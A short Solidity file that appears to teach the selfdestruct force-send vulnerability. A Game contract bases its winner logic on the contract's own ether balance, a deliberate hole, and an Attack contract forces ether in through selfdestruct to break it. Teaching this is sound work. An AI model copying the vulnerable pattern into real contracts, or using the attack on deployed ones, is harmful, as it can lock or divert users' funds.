// SPDX-License-Identifier: SEE LICENSE IN LICENSE

/**
 * @title SelfDestruct
 * @dev This contract demonstrates the use of selfdestruct() function to destroy a contract and send its remaining ether to a designated address.
 */
pragma solidity ^0.8.20;

contract Game {
    uint256 targeAmount = 7 ether; // The target amount of ether to be deposited in the contract
    mapping(address => uint256) balances; // Mapping to keep track of the deposited ether of each address
    address public winner; // The address of the winner who deposited the last ether to reach the target amount

    /**
     * @dev Function to deposit 1 ether to the contract
     * Emits a Deposit event when a deposit is made
     * Reverts if the deposited amount is not 1 ether or the target amount is already reached
     */
    function deposit() external payable {
        require(msg.value == 1 ether, "Deposit amount must be 1 ether");
        uint256 bal = address(this).balance;
        require(bal <= targeAmount, "Target amount already reached");
        if (targeAmount == bal) {
            winner = msg.sender;
        }
    }

    /**
     * @dev Function to claim the reward by the winner
     * Reverts if the caller is not the winner
     * Sends the contract balance to the winner
     */
    function claimReward() external {
        require(msg.sender == winner, "Only winner can claim the reward");
        (bool success, ) = msg.sender.call{value: address(this).balance}("");
        require(success, "Failed to send reward");
    }
}

contract Attack {
    /**
     * @dev Constructor to deploy the contract with some initial ether
     */
    constructor() payable {}

    /**
     * @dev Function to self-destruct the contract and send its remaining ether to a designated address
     * @param _addr The address to receive the remaining ether
     */
    function selfDestruct(address payable _addr) external {
        selfdestruct(_addr);
    }
}
